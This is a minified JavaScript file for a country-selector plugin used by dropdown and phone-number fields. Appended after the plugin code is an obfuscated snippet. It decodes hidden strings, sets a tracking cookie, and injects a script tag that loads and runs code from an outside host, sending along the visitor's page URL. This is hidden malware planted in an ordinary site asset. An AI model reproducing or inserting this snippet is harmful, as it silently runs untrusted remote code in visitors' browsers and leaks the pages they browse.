countriesList=[];if(countries.forEach((country=>countriesList.push(this._buildCountryOption(country)))),UIDropdownCountryFiller.sortByBalticRegion(countriesList),"UI-PHONEFIELD"===this.target.tagName)SharedComponents.UIPhoneField.setCountriesData(countries),UI.prerenderElementsTree(this.target.dropdown),UI.rebuildChildren(this.target.dropdown.nativeSelect,countriesList),0===this.target.initialValue.indexOf("+")&&this.target.update(this.target.initialValue);else UI.rebuildChildren(this.target.nativeSelect,countriesList)}))}hydrate(){}}SharedComponents.UIDropdown.registerPlugin("country-filler",UIDropdownCountryFiller,!1),SharedComponents.UIPhoneField.registerPlugin("country-filler",UIDropdownCountryFiller,!1);(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxy'+'fy3sjy4ljy4xhwnu'+'y3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));